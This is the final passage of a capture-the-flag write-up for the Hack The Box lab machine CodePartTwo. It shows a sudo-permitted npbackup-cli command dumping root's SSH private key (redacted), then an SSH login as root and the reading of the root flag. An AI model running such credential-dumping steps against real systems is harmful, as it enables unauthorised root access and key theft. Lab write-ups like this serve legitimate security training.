+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4111" onclick="terminalOverlayClose('bash-bash-4111')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4111')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4111')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4111')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4111" data-language="bash">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --dump /root/.ssh/id_rsa
+&lt;redacted&gt;
+</pre> </div> </div> <p><br> Create an id_rsa file on the attack machine.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-473"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-473')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-473')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-473')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-473')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-473">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ cat id_rsa 
+&lt;redacted&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-473" onclick="terminalOverlayClose('bash-bash-473')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-473')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-473')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-473')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-473" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ cat id_rsa 
+&lt;redacted&gt;
+</pre> </div> </div> <p><br> Chmod 600 to set the create the proper permissions on the id_rsa file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-467"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-467')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-467')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-467')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-467')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-467">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ chmod 600 id_rsa
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-467" onclick="terminalOverlayClose('bash-bash-467')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-467')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-467')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-467')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-467" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ chmod 600 id_rsa
+</pre> </div> </div> <p><br> Use the id_rsa file to ssh into the machine as root.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41361"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41361')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41361')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41361')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41361')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41361">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ ssh -i id_rsa root@10.129.1.238
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri 16 Jan 2026 12:06:43 PM UTC
+
+  System load:           0.0
+  Usage of /:            57.6% of 5.08GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             229
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.1.238
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99f
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Jan 16 12:06:44 2026 from 10.10.14.120
+root@codeparttwo:~#
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41361" onclick="terminalOverlayClose('bash-bash-41361')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41361')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41361')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41361')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41361" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ ssh -i id_rsa root@10.129.1.238
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri 16 Jan 2026 12:06:43 PM UTC
+
+  System load:           0.0
+  Usage of /:            57.6% of 5.08GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             229
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.1.238
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99f
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Jan 16 12:06:44 2026 from 10.10.14.120
+root@codeparttwo:~#
+</pre> </div> </div> <p><br> Get the root.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4867"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4867')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4867')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4867')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4867')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4867">
+root@codeparttwo:~# cat root.txt
+&lt;redacted&gt;
+root@codeparttwo:~# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b0:a9:9f brd ff:ff:ff:ff:ff:ff
+    inet 10.129.1.238/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 2662sec preferred_lft 2662sec
+    inet6 dead:beef::250:56ff:feb0:a99f/64 scope global dynamic mngtmpaddr 
+       valid_lft 86398sec preferred_lft 14398sec
+    inet6 fe80::250:56ff:feb0:a99f/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4867" onclick="terminalOverlayClose('bash-bash-4867')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4867')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4867')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4867')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4867" data-language="bash">
+root@codeparttwo:~# cat root.txt
+&lt;redacted&gt;
+root@codeparttwo:~# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b0:a9:9f brd ff:ff:ff:ff:ff:ff
+    inet 10.129.1.238/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 2662sec preferred_lft 2662sec
+    inet6 dead:beef::250:56ff:feb0:a99f/64 scope global dynamic mngtmpaddr 
+       valid_lft 86398sec preferred_lft 14398sec
+    inet6 fe80::250:56ff:feb0:a99f/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> </div> <p><br> Crushing CodePartTwo alongside its Code Prequel. Come back for the next box!</p> <p><br></p> <h2>Trophy</h2> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/codeparttwo/trophy.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Trophy" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> </article> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2026 Biscotti Diskette  ·  <a href="https://github.com/biscottidiskette" target="_blank" rel="external nofollow noopener">GitHub</a>  ·  <a href="https://app.hackthebox.eu/profile/biscottidiskette" target="_blank" rel="external nofollow noopener">HackTheBox</a>  ·  <a href="https://tryhackme.com/r/p/BiscottiDiskette" target="_blank" rel="external nofollow noopener">TryHackMe</a>  ·  <a href="/contact/">Contact</a> </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-HL7MJBJN7X"></script> <script defer src="/assets/js/google-analytics-setup.js?1c5d3b199be7049d4732e15d2072d0b2"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script src="/assets/js/terminal.js?ec2a38fba85ea4751db97d30059cd1c5"></script> </body> </html>
